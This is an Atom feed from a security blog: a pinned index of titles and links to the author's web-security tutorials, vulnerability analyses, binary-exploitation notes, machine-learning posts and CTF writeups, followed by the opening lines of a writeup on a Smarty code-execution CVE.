<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chybeta.github.io/"/>
  <updated>2017-12-26T09:40:50.120Z</updated>
  <id>http://chybeta.github.io/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://chybeta.github.io/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://chybeta.github.io/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2017-12-26T09:40:50.120Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">Code-Audit-Challenges</a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">php文件包含漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2017/12/26/axublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">axublog v1.0.6 两处sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">AppCMS 2.0.101 后门分析 </a></li>
<li><a href="https://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/">[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析</a></li>
<li><a href="https://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/">Node.js中的反序列化漏洞：CVE-2017-5941 </a></li>
<li><a href="https://chybeta.github.io/2017/10/15/DiscuzX-v3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/">DiscuzX v3.4 任意文件删除漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ICMSv7.0.1 admincp.class.php sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/10/19/Linux-kernel-development-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">Linux kernel development (1): 环境准备 </a></li>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/">Flask Web开发笔记(1):程序的基本结构 </a></li>
<li><a href="https://chybeta.github.io/2017/09/04/hexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/">hexo-rss链接问题修复方法</a></li>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道CTF题：PHP文件包含 </a></li>
<li><a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/">2017年百越杯AWD-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/">Hack.lu CTF 2017-Flatscience-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/">Square CTF 2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/">BackdoorCTF 2017-Extends Me-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/">CSAW CTF 2017-LittleQuery-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/">CSAW CTF 2017-Shia Labeouf-off-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/">CSAW CTF 2017-Orange v1-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/">问鼎杯 CTF writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/">SEC-T CTF2017-Naughty ads-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/">SEC-T CTF2017-Sprinkler system-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/">ASISCTF2017-GSA File Server-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/">ASISCTF2017-Mathilda-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/">WeChall-PHP-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">TWCTF 2017-Super Secure Storage-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/">TWCTF 2017-Freshen Uploader-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/">ISG2017-wmwcms-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">HITB CTF 2017-Pasty-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/">Hackit2017-H4ck3rM1nd-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/">Hackit2017-Weekands of hacker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/">TWCTF 2017-swap-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/">XMAN-pwn-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/">CSAW CTF 2017-MISC-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/">ASISCTF2017-ASIS secret letter-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/">ASISCTF2017-Simple Crypto-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/">TWCTF 2017-Rev Rev Rev-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Insomni&#39;hack teaser 2018-Smart-Y-writeup</title>
    <link href="http://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/"/>
    <id>http://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/</id>
    <published>2018-01-23T12:23:33.000Z</published>
    <updated>2018-01-23T12:33:20.958Z</updated>
    
    <content type="html"><![CDATA[<p>Insomni’hack teaser 2018-Smart-Y-writeup</p>
<p>CVE-2017-1000480-Smarty-3-1-32-php代码执行-漏洞<br><a id="more"></a></p>
